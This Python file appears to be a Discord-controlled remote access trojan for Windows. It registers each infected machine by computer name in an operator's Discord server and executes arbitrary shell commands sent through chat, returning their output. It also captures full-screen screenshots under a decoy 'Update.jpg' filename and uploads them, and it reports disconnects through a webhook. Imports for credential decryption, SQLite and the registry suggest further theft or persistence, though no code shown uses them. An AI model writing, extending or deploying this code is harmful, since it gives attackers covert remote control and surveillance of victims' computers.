import discord
import os
import asyncio
import requests
import urllib
import json
import ctypes
import sys
import atexit
import re
import base64
import sqlite3
import shutil
import win32crypt
import subprocess
import winreg as reg
from PIL import Image
from discord.ext import commands
import win32api, win32con, win32gui, win32ui

intents = discord.Intents.all()
intents.message_content = True

whURL = ''
TOKEN = ''
serverID =  #Takes an integer

webhook = discord.SyncWebhook.from_url(whURL)
client = discord.Client(intents=intents)
guild = ''

hwid = ''

@client.event
async def on_ready():
    first_run = True
    global hwid
    global guild
    
    hwid = os.getenv("COMPUTERNAME")
    guild = client.get_guild(serverID)
   
    for category_name in guild.categories:
        if hwid == str(category_name):

            first_run = False
            break
        
    for channel in guild.channels:
        if str(channel) == 'check-in':
            await channel.send("{} has connected.".format(hwid))
            break

    if first_run:
        category = await guild.create_category(hwid)
        await guild.create_text_channel('main', category=category)              
        
@client.event
async def on_message(msg):
    for category in msg.guild.categories:
        if hwid == str(category.name) or msg.channel.name == 'main-all':
            main_channel = discord.utils.get(category.channels, name='main')
            if (main_channel and msg.channel == main_channel) or msg.channel.name == 'main-all':
                prefix = b'Results of ' + msg.content.encode() + b' \n\n'
                response = b''

                if msg.author == client.user:
                    return
                
                str_msg = msg.content.lower()

                try:
                    command = str_msg.split(" ", 1)[0]
                    args = str_msg.split(" ", 1)[1]
                except IndexError:
                    pass
                
                if str_msg[0] == ">":
                    str_msg = str_msg[1:]
                    
                    if str_msg[0] == " ":
                        str_msg = str_msg[1:]

                    for line in runCommand(str_msg):
                        response += line
                        
                        if len(response) > 2000:
                            t = response[2000:]
                            response = response[:2000]
                            
                            await msg.channel.send(response.decode())
                            
                            if t:
                                await msg.channel.send(t.decode())
                            
                            response = b''
                            t = b''

                    if response == b'':
                        response = prefix + b'Invalid Command.'
                        
                    else:
                        response = prefix + response
                    
                    await msg.channel.send(response.decode())
                    
                elif str_msg == "ss" or str_msg == "screenshot":
                    s = getScreenshot()
                    
                    if s:
                        await msg.channel.send(file=discord.File("C:\\Users\\Public\\Downloads\\Update.jpg"))
                        
                        os.remove("C:\\Users\\Public\\Downloads\\Update.jpg")
                        
                    else:
                        await msg.channel.send("Failed to take screenshot.")
    
def runCommand(command):
    try:
        p = subprocess.Popen(command, shell = True,
                             stdout=subprocess.PIPE,
                             stderr=subprocess.STDOUT)
        
        return iter(p.stdout.readline, b'')    
    except Exception as p:
        return p
        
#Get screenshot of current window
def getScreenshot(path=None):
    try:
        x = 0
        y = 0
        
        x2 = win32api.GetSystemMetrics(0)
        y2 = win32api.GetSystemMetrics(1)
        
        W = x2 - x
        H = y2 - y
        
        #get image data
        wDC = win32gui.GetWindowDC(None)
        dcObj = win32ui.CreateDCFromHandle(wDC)
        cDC = dcObj.CreateCompatibleDC()
        dataBitMap = win32ui.CreateBitmap()
        dataBitMap.CreateCompatibleBitmap(dcObj, W, H)
        cDC.SelectObject(dataBitMap)
        cDC.BitBlt((0, 0), (W, H), dcObj, (0, 0), win32con.SRCCOPY)

        if path == None:
            dataBitMap.SaveBitmapFile(cDC, 'C:\\Users\\Public\\Downloads\\Update.jpg')
            img = Image.open('C:\\Users\\Public\\Downloads\\Update.jpg')
            img.save('C:\\Users\\Public\\Downloads\\Update.jpg', optimize=True)
        else:
            dataBitMap.SaveBitmapFile(cDC, path)

        #Free Resources
        dcObj.DeleteDC()
        cDC.DeleteDC()
        win32gui.ReleaseDC(None, wDC)
        win32gui.DeleteObject(dataBitMap.GetHandle())

        return True
        
    except:
        return False

def exit_handler():
    message = hwid + " has disconnected."
    
    webhook.send(message)    
           
atexit.register(exit_handler)

client.run(TOKEN)
